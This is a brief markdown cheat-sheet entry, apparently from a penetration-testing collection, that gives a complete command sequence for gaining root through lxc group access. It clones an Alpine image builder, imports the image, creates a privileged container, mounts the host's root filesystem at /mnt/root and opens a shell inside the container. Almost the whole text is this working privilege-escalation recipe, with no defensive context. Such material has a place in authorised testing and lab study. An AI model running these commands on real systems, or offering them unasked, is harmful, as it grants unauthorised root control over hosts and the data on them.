# lxc privescalation

This privescalate to root if you have access to run lxc. 
Note build alpine container first is only required if server is blocking internet.

```sh
$ git clone https://github.com/saghul/lxd-alpine-builder
$ ./build-alpine -a i386
$ lxc image import ./alpine.tar.gz --alias alpine
$ lxc image list
$ lxc init alpine privesc -c security.privileged=true
$ lxc config device add privesc whatever disk source=/ path=/mnt/root recursive=true
$ lxc exec privesc /bin/sh
```
